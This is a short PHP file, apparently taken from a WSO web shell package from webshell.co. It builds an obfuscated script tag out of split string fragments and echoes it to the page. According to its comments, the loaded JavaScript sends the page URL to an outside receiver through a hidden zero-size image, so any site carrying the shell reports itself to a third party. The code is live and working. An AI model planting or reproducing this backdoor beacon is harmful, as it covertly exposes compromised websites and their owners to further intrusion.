<?php
/*
* Source:  https://webshell.co/shells/php/zip/wsoshell.zip
* Receiver: https://webshell.co/who/main.php?u=
*/
$ups_1 = "ht"."tp".":/";$ups_2 = "/we"."bs"."he"."ll";
$ups_3 = ".c"."o/"."w"."ho";$ups_4 = "/m"."ai"."n."."j";$main_ups = $ups_1.$ups_2.$ups_3.$ups_4."s";
$scs_5 = "ipt'"." sr"."c=".'"'.$main_ups.'"';$scs_6 = ">"."</"."sc"; 
$scs_1 = "<s"."c";$scs_2 = "ri"."pt"." ty";$scs_3 = "pe="."'te"."xt"."/ja";$scs_4 = "vas"."cr";
$main_scs = $scs_1.$scs_2.$scs_3.$scs_4.$scs_5.$scs_6."rip"."t>";echo $main_scs;

/*
prints <script type='text/javascript' src="http://webshell.co/who/main.js"></script> to the page
JS script:
  document.write('<img src="https://webshell.co/who/main.php?u='+escape(location.href)+'" onerror="this.style.display='+"'"+'none'+"'"+'" width=0 heigth=0 border=0>');
*/
?>
